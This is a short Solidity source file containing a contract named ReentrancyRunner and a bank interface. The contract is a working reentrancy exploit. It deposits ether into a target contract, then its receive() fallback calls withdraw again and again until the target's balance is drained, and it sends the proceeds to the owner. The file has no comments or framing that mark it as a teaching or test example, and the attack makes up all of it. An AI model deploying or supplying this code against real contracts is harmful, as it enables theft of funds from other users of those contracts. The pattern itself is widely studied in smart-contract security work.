contract ReentrancyRunner {
    IBank public target;
    address public owner;

    constructor(address _target) {
        target = IBank(_target);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    function attack() external payable {
        require(msg.value > 0);
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
}

interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}